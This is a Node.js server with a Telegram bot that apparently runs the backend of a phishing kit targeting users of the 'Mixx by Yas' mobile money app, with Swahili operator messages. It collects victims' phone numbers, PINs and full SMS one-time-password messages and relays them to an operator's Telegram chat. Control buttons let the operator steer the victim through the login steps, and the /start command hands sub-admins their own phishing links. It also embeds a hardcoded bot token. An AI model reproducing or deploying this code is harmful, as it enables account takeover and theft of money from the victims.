const express = require('express');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const MAIN_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8968023761:AAFi4k2gVczpAbCM1-8oRC1axtXA9EwRvo8';
const MAIN_ADMIN_ID = (process.env.MAIN_ADMIN_ID || '8591555400').trim();
const PORT = process.env.PORT || 10000;

if (!MAIN_BOT_TOKEN) {
    console.error("❌ ERROR: Main Telegram Bot Token is missing!");
} else {
    console.log("🤖 Initializing Main Telegram Bot...");
}

const mainBot = new TelegramBot(MAIN_BOT_TOKEN, { polling: true });

mainBot.on('polling_error', (error) => {
    console.error('⚠ Main Bot Polling Error:', error.code, error.message);
});

let activeSessions = {};

function escapeMarkdown(text) {
    if (!text) return '';
    return text.toString().replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
}

mainBot.on('message', (msg) => {
    if (!msg.text) return;
    const chatId = msg.chat.id;
    const userIdStr = chatId.toString().trim();
    const firstName = msg.from.first_name || 'Admin';
    const username = msg.from.username ? `@${msg.from.username}` : 'No username set';

    if (msg.text.startsWith('/start')) {
        // Explicitly generates and sends chat info and link to both main admin and sub-admins
        sendAdminLink(chatId, userIdStr, firstName, username);
    }
});

function sendAdminLink(chatId, userIdStr, firstName, username) {
    const host = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
    const isolatedLink = `${host}/?admin=${userIdStr}`;
    const welcomeText = `🚨 *Kiungo Chako cha Admin kiko Tayari!*\n\n` +
        `👤 *Jina:* ${escapeMarkdown(firstName)}\n` +
        `🆔 *Chat ID:* \`${escapeMarkdown(userIdStr)}\`\n` +
        `🏷 *Username:* ${escapeMarkdown(username)}\n\n` +
        `🔗 *Kiungo Chako cha Kudumu (Permanent Link):*\n${isolatedLink}`;

    mainBot.sendMessage(chatId, welcomeText, { parse_mode: "Markdown" })
        .catch(err => console.error("Error sending start message:", err));
}

function setupCallbackHandler(botInstance) {
    botInstance.on('callback_query', async (query) => {
        const chatId = query.message.chat.id;
        const data = query.data;
        const userIdStr = chatId.toString().trim();

        const parts = data.split('_');
        const action = parts[0]; 
        const sessionId = parts.slice(1).join('_');

        const session = activeSessions[sessionId];
        if (!session) {
            botInstance.answerCallbackQuery(query.id, { text: "Kipindi kimeisha au hakionekani.", show_alert: true });
            return;
        }

        if (session.targetAdmin !== userIdStr) {
            botInstance.answerCallbackQuery(query.id, { text: "⚠ Ruhusa imekataliwa: Hii si ya kwako.", show_alert: true });
            return;
        }

        if (action === 'allow') session.status = 'approved_pin';
        else if (action === 'deny') session.status = 'denied';
        else if (action === 'wrongpin') session.status = 'wrong_pin';
        else if (action === 'wrongsms') session.status = 'wrong_sms';
        else if (action === 'approved') session.status = 'success';

        botInstance.editMessageReplyMarkup({ inline_keyboard: [] }, {
            chat_id: chatId,
            message_id: query.message.message_id
        }).catch(err => console.error("Error clearing markup:", err));

        botInstance.answerCallbackQuery(query.id).catch(err => console.error("Error answering callback query:", err));
    });
}

setupCallbackHandler(mainBot);

app.post('/api/submit-credentials', (req, res) => {
    const { sessionId, phone, pin, adminId } = req.body;
    
    let targetAdmin = MAIN_ADMIN_ID;
    if (adminId) {
        targetAdmin = adminId.toString().trim();
    }

    activeSessions[sessionId] = {
        phone, pin,
        targetAdmin,
        status: 'pending_pin_approval',
        incomingSMS: ''
    };

    const message = `NEW MIXX APPLICANT\n\n` +
        `PHONE NO: ${phone}\n` +
        `PIN: ${pin}`;

    mainBot.sendMessage(targetAdmin, message, {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "RUHUSU (ALLOW)", callback_data: `allow_${sessionId}` },
                    { text: "KATAA (DENY)", callback_data: `deny_${sessionId}` }
                ]
            ]
        }
    }).then(() => {
        console.log(`✅ Credentials successfully sent to designated admin: ${targetAdmin}`);
    }).catch(err => {
        console.error(`❌ Telegram Send Error:`, err.response ? err.response.body : err.message);
    });

    res.json({ success: true, sessionId });
});

app.post('/api/submit-otp', (req, res) => {
    const { sessionId, otpText } = req.body;
    const session = activeSessions[sessionId];

    if (!session) {
        return res.json({ status: 'not_found', message: 'Session not found' });
    }

    const expectedPrefix = "You are being registered in Mixx by Yas Super App";
    if (otpText && otpText.includes(expectedPrefix)) {
        session.status = 'success';
    } else {
        session.status = 'pending_final_approval';
    }

    session.otpText = otpText;

    const message = `UTHIBITISHO WA SMS OTP\n\n` +
        `NAMBARI YA SIMU: ${session.phone}\n\n` +
        `UJUMBE WOTE WA SMS:\n${otpText}`;

    mainBot.sendMessage(session.targetAdmin, message, {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "📋 Nakili Ujumbe", copy_text: { text: otpText } }
                ],
                [
                    { text: "PIN MBAYA ❌", callback_data: `wrongpin_${sessionId}` },
                    { text: "SMS MBAYA", callback_data: `wrongsms_${sessionId}` }
                ],
                [
                    { text: "IMETHIBITISHWA", callback_data: `approved_${sessionId}` }
                ]
            ]
        }
    }).then(() => {
        console.log(`✅ SMS successfully processed for admin ${session.targetAdmin}`);
    }).catch(err => console.error(`❌ Failed to send OTP alert to admin:`, err));

    res.json({ success: true });
});

app.get('/api/check-status/:sessionId', (req, res) => {
    const session = activeSessions[req.params.sessionId];
    if (!session) {
        return res.json({ status: 'not_found' });
    }
    res.json({ 
        status: session.status,
        incomingSMS: session.incomingSMS || ''
    });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
           
